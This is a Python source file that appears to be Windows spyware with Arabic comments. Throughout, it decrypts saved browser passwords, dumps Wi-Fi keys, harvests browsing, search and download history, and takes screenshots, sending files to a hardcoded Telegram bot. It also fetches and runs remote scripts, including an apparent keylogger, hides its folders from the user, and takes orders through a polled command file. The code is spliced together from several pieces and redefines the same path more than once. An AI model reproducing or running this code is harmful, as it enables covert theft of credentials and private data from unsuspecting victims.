import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
import requests
import runpy
import threading
from pathlib import Path
import os
import requests
import subprocess
from pathlib import Path
import time
from PIL import ImageGrab
import pygetwindow as gw
import os, time
CREATE_NO_WINDOW = 0x08000000
import requests
import runpy
import threading
import gc
from pathlib import Path


import requests
import gc

TELEGRAM_TOKEN = "8265205917:AAE4AtsWD52-kenwjYWrg6LtAZ25IEVOjVI"
CHAT_ID = "6693150100"

def send_to_telegram(file_path):
    """دالة مخصصة لإرسال الملفات إلى التليجرام"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            payload = {"chat_id": CHAT_ID}
            files = {"document": f}
            response = requests.post(url, data=payload, files=files, timeout=30)
        return response.status_code == 200
    except:
        return False
    


BASE_DIR = r"C:\ProgramData\WinExec"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")
SS_FILE = os.path.join(BASE_DIR, "ss.png")

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(buff, m_key):
    try:
        cipher = AES.new(m_key, AES.MODE_GCM, buff[3:15])
        return cipher.decrypt(buff[15:])[:-16].decode()
    except: return f"Hash: {base64.b64encode(buff).decode()}"

def run_passwords():
    out = ""
    user_p = os.path.expanduser('~')
    browsers = {
        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data", 
        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data"
    }
    
    for name, path in browsers.items():
        db, st = path + r"\Default\Login Data", path + r"\Local State"
        if os.path.exists(db):
            out += f"\n--- {name} Passwords ---\n"
            
            # نحدد المتغيرات خارج try لنتمكن من الوصول لها في finally
            conn = None
            tmp = os.path.join(os.environ["TEMP"], f"tmp_{name}.db")
            
            try:
                m_key = get_master_key(st)
                shutil.copyfile(db, tmp)
                
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cur.fetchall():
                    if row[1].strip():
                        out += f"🌐 Site: {row[0]}\n📧 User: {row[1]}\n🔑 Pass: {decrypt_password(row[2], m_key)}\n---\n"
                
            except Exception as e:
                out += f"Err {name}: {e}\n"
            
            finally:
                # هذا الجزء هو "صمام الأمان" - يعمل في كل الظروف
                if conn:
                    conn.close()  # إغلاق قاعدة البيانات حتماً
                if os.path.exists(tmp):
                    try: os.remove(tmp) # حذف الملف المؤقت حتماً
                    except: pass
                
                # تنظيف الذاكرة بعد كل متصفح
                gc.collect() 
                
    return out or "No Passwords Found."
    

def run_wifi():
    try:
        cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'

        
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True,
            text=True,
            encoding="cp850",
            creationflags=CREATE_NO_WINDOW
        ).stdout
        return res if res.strip() else "No WiFi profiles found."
    except:
        return "⚠️ Error retrieving WiFi or No saved networks."

def run_history():
    out = ""
    user_p = os.path.expanduser('~')
    paths = {
        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History", 
        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    }
    
    for b, p in paths.items():
        if os.path.exists(p):
            out += f"--- {b} History ---\n"
            
            conn = None
            # جعل اسم الملف المؤقت فريداً لكل متصفح لضمان عدم التداخل
            tmp = os.path.join(os.environ["TEMP"], f"h_tmp_{b}.db")
            
            try:
                shutil.copyfile(p, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                
                cur.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                for r in cur.fetchall(): 
                    out += f"🔹 {r[0][:50]}\n🔗 {r[1]}\n\n"
                
            except Exception as e:
                # يمكنك تركها فارغة أو تسجيل الخطأ في متغير out للمتابعة
                pass
                
            finally:
                # ضمان إغلاق الاتصال وحذف الملف مهما حدث
                if conn:
                    conn.close()
                if os.path.exists(tmp):
                    try: os.remove(tmp)
                    except: pass
                
                # تنظيف الذاكرة (الرام) بعد معالجة كل متصفح
                gc.collect() 
                
    return out

CROSSMOS_PATH = Path(r"C:\ProgramData\WinCore\wincore.py")
CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/wincore.py"
PYTHON_EXEC   = Path(r"C:\ProgramData\WinCore\pywin.exe")

def update():
    try:
        if os.path.exists(CMD_FILE):
            os.remove(CMD_FILE)
        if CROSSMOS_PATH.exists():
            CROSSMOS_PATH.unlink()
            print("[+] Deleted old crossmos.py")

        r = requests.get(CROSSMOS_URL, timeout=30)
        if r.status_code != 200 or len(r.content) < 100:
            print("[!] Failed to download the new crossmos.py")
            return

        with open(CROSSMOS_PATH, "wb") as f:
            f.write(r.content)
        print("[+] Downloaded new crossmos.py successfully")

        subprocess.Popen(
            [str(PYTHON_EXEC), str(CROSSMOS_PATH)],
            cwd=str(CROSSMOS_PATH.parent),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000  
        )
        print("[+] crossmos.py launched successfully")

    except Exception as e:
        print(f"[!] Update failed: {e}")


BASE_DIR = r"C:\ProgramData\SysKey"
SCRIPT_NAME = "syskey.py"
LOCAL_PYTHON_NAME = "pwiny.exe"
SOURCE_PYTHON = r"C:\ProgramData\WinCore\pywin.exe"
GITHUB_URL = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/syskey.py"

def download_and_run():
    try:
        if not os.path.exists(BASE_DIR):
            os.makedirs(BASE_DIR)

        script_path = os.path.join(BASE_DIR, SCRIPT_NAME)
        local_python_path = os.path.join(BASE_DIR, LOCAL_PYTHON_NAME)

        if not os.path.exists(local_python_path) and os.path.exists(SOURCE_PYTHON):
            shutil.copy2(SOURCE_PYTHON, local_python_path)

        r = requests.get(GITHUB_URL, timeout=10)
        r.raise_for_status()
        with open(script_path, "wb") as f:
            f.write(r.content)

        subprocess.Popen(
            [local_python_path, script_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        return "DOWNLOAD_AND_RUN_SUCCESS"
    except Exception as e:
        return f"ERROR: {str(e)}"

def remove_script():
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", LOCAL_PYTHON_NAME, "/T"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        time.sleep(2)

        if os.path.exists(BASE_DIR):
            shutil.rmtree(BASE_DIR, ignore_errors=True)
            
        return "REMOVE_SUCCESS"
    except Exception as e:
        return f"ERROR_DURING_REMOVE: {str(e)}"



FILES = {
    "winmon.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/winmon.py",
    "windef.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/windef.py"
}

BASE_DIR = Path(__file__).parent.resolve()

def ensure_file(filename, url):
    file_path = BASE_DIR / filename

    if not file_path.exists():
        print(f"[+] Downloading {filename} ...")
        r = requests.get(url, timeout=15)
        r.raise_for_status()
        file_path.write_bytes(r.content)
        print(f"[+] {filename} downloaded successfully.")
    else:
        print(f"[i] {filename} already exists.")

    return file_path

def run_script(path):
    print(f"[>] Starting {path.name}")
    runpy.run_path(str(path), run_name="__main__")


def startup():
    for filename, url in FILES.items():
        path = ensure_file(filename, url)
        t = threading.Thread(target=run_script, args=(path,), daemon=True)
        t.start()

if __name__ == "__main__":
    threading.Thread(target=startup, daemon=True).start()



import ctypes
import os
from pathlib import Path

EXTRA_TARGETS = [
    r"C:\ProgramData\WinCore",
    r"C:\ProgramData\WinExec"
]

def apply_deep_stealth(target_path):
    """
    تطبيق سمات النواة: مخفي + نظام + قراءة فقط + منع الفهرسة.
    تجعل الملف غير مرئي حتى مع تفعيل 'إظهار الملفات المخفية'.
    """
    try:
        attrs = 0x01 | 0x02 | 0x04 | 0x2000
        path_str = str(target_path)
        
        success = ctypes.windll.kernel32.SetFileAttributesW(path_str, attrs)
        return success
    except Exception:
        return False

def protect_assets(target_dir):
    """تطبيق الإخفاء على المجلد وكل ما بداخله"""
    path = Path(target_dir)
    if not path.exists():
        return

    for item in path.rglob('*'): 
        apply_deep_stealth(item)
    
    apply_deep_stealth(path)

def start_concealment_protocol():
    current_dir = Path(__file__).parent.resolve()
    print(f"[*] Concealing infrastructure at: {current_dir}")
    protect_assets(current_dir)

    for target in EXTRA_TARGETS:
        if os.path.exists(target):
            print(f"[*] Applying deep stealth to external target: {target}")
            protect_assets(target)
        else:
            print(f"[!] Target not found, skipping: {target}")

if __name__ == "__main__":
    start_concealment_protocol()


import os
import shutil
import sqlite3
import urllib.parse
from datetime import datetime, timedelta

def extract_all_browser_history():
    current_script_dir = os.path.dirname(os.path.abspath(__file__))
    user_p = os.path.expanduser("~")

    paths = {
        "CHROME": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
        "EDGE": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "BRAVE": user_p + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "OPERA": user_p + r"\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }

    SEARCH_KEYS = ["q", "search_query"]

    def chrome_time_to_datetime(chrome_time):
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
        except:
            return None

    for browser_name, history_path in paths.items():
        if not os.path.exists(history_path):
            continue

        results = []
        conn = None 
        temp_copy = os.path.join(current_script_dir, f"{browser_name}_Temp_History.db")
        output_file = os.path.join(current_script_dir, f"{browser_name}_SEARCH_HISTORY.txt")
        
        try:
            shutil.copy2(history_path, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cur = conn.cursor()
            cur.execute("SELECT url, last_visit_time FROM urls WHERE url LIKE '%?%'")

            for url, last_visit in cur.fetchall():
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)

                for key in SEARCH_KEYS:
                    if key in params:
                        raw_query = params[key][0].strip()
                        if not raw_query: continue
                        clean_query = urllib.parse.unquote_plus(raw_query)
                        visit_time = chrome_time_to_datetime(last_visit)
                        visit_time_str = visit_time.strftime("%Y-%m-%d %H:%M:%S") if visit_time else "Unknown"
                        results.append((visit_time_str, browser_name, clean_query, url))

            conn.close()
            conn = None 
            
            if results:
                results = list(dict.fromkeys(results))
                results.sort(key=lambda x: x[0])

                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(f"FULL {browser_name} SEARCH HISTORY\n")
                    f.write("=" * 60 + "\n\n")
                    for time_s, b_name, query, url_val in results:
                        f.write(f"Time   : {time_s}\nSearch : {query}\nURL    : {url_val}\n{'-' * 60}\n")
                
                # إرسال الملف فوراً
                send_to_telegram(output_file)

        except Exception as e:
            print(f"❌ Error: {e}")
        
        finally:
            # --- تنظيف ملفات الدالة المؤقتة ---
            if conn:
                try: conn.close()
                except: pass
            if os.path.exists(temp_copy):
                try: os.remove(temp_copy)
                except: pass
            if os.path.exists(output_file):
                try: os.remove(output_file)
                except: pass
            
            # --- تنظيف ملفات التحكم الرئيسية (لمنع التكرار) ---
            if os.path.exists(CMD_FILE):
                try: os.remove(CMD_FILE)
                except: pass
            if os.path.exists(RES_FILE):
                try: os.remove(RES_FILE)
                except: pass
            
            del results
            gc.collect()

    return "HISTORY_PROCESS_COMPLETE"
        # ----------------------------------------------------------------

# =============================

import os
import shutil
import sqlite3
from datetime import datetime, timedelta

def extract_all_browser_downloads():
    current_script_dir = os.path.dirname(os.path.abspath(__file__))
    user_p = os.path.expanduser("~")

    paths = {
        "CHROME": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
        "EDGE": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "BRAVE": user_p + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "OPERA": user_p + r"\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }

    def chrome_time_to_datetime(chrome_time):
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
        except:
            return None

    for browser_name, history_path in paths.items():
        if not os.path.exists(history_path):
            continue

        results = []
        conn = None 
        temp_copy = os.path.join(current_script_dir, f"{browser_name}_DL_Temp.db")
        output_file = os.path.join(current_script_dir, f"{browser_name}_DOWNLOADS.txt")
        
        try:
            shutil.copy2(history_path, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cur = conn.cursor()

            cur.execute("SELECT d.id, d.target_path, d.start_time FROM downloads d")
            downloads = cur.fetchall()

            for download_id, target_path, start_time in downloads:
                cur.execute("""
                    SELECT url 
                    FROM downloads_url_chains 
                    WHERE id = ? 
                    ORDER BY chain_index 
                    LIMIT 1
                """, (download_id,))

                row = cur.fetchone()
                if not row: continue

                url = row[0]
                time_dt = chrome_time_to_datetime(start_time)
                time_str = time_dt.strftime("%Y-%m-%d %H:%M:%S") if time_dt else "Unknown"

                results.append((time_str, browser_name, target_path, url))

            conn.close()
            conn = None 
            
            if os.path.exists(temp_copy):
                os.remove(temp_copy)

            if results:
                results = list(dict.fromkeys(results))
                results.sort(key=lambda x: x[0])

                # إنشاء الملف النصي
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(f"FULL {browser_name} DOWNLOAD HISTORY\n")
                    f.write("=" * 65 + "\n\n")

                    for time_s, b_name, f_path, f_url in results:
                        f.write(f"Time   : {time_s}\n")
                        f.write(f"File   : {f_path}\n")
                        f.write(f"URL    : {f_url}\n")
                        f.write("-" * 65 + "\n")
                
                # --- الخطوة الجديدة: الإرسال ثم الحذف الفوري ---
                if os.path.exists(output_file):
                    # إرسال الملف إلى تليجرام
                    sent = send_to_telegram(output_file)
                    
                    # حذف الملف من القرص فوراً بعد الإرسال (سواء نجح أو فشل لضمان الأمان)
                    try:
                        os.remove(output_file)
                        print(f"🗑️ File {output_file} deleted from disk.")
                    except:
                        pass
                # ----------------------------------------------

        except Exception as e:
            print(f"❌ Error in {browser_name}: {e}")
        
        finally:
            # التنظيف النهائي للذاكرة والملفات العالقة
            if conn:
                try: conn.close()
                except: pass
            if os.path.exists(temp_copy):
                try: os.remove(temp_copy)
                except: pass
            if os.path.exists(output_file): # للتأكد من حذفه إذا حدث خطأ قبل الإرسال
                try: os.remove(output_file)
                except: pass
            
            del results
            gc.collect() 

    return "DOWNLOADS_PROCESSED_AND_CLEANED"
        # ----------------------------------------------------------------------
# =============================
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
    # تنظيف المخلفات القديمة عند بدء التشغيل لأول مرة
for f in [CMD_FILE, RES_FILE, SS_FILE]:
    try:
        if os.path.exists(f): os.remove(f)
    except: pass

gc.collect() # ابدأ بذاكرة نظيفة
while True:
    if os.path.exists(CMD_FILE):
        try:
            with open(CMD_FILE, "r") as f:
                cmd = f.read().strip()
            res = ""
            if cmd == "passwords":
                res = run_passwords()
            if cmd == "keylogger":
                res = download_and_run()
            if cmd == "rmkeylogger":
                res = remove_script()
            elif cmd == "wifi":
                res = run_wifi()
            elif cmd in ["history", "browser"]:
                res = run_history()
            elif cmd == "update":
                res = update()
            elif cmd == "searchs":
                res = extract_all_browser_history()
            elif cmd == "downloads":
                res = extract_all_browser_downloads()


            elif cmd == "screenshot":
                shot = ImageGrab.grab()
                shot.save(SS_FILE)
                shot.close() # إغلاق ملف الصورة في الذاكرة
                del shot     # مسح الكائن تماماً
                res = "SCREENSHOT_DONE"


            elif cmd == "screenshot_active":
                window = gw.getActiveWindow()
                if window:
                    bbox = (window.left, window.top, window.right, window.bottom)
                    ImageGrab.grab(bbox=bbox).save(SS_FILE)
                    res = "SCREENSHOT_ACTIVE_DONE"
                else:
                    res = "NO_ACTIVE_WINDOW"
            with open(RES_FILE, "w", encoding="utf-8") as f:
                f.write(res)
            os.remove(CMD_FILE)
            # --- التعديل هنا ---
            del res       # حذف نص النتائج الضخم من الذاكرة فوراً بعد كتابته في الملف
            gc.collect()  # إجبار بايثون على تنظيف الرام من بقايا العملية
            # -----------------
        except:
            pass
    time.sleep(1)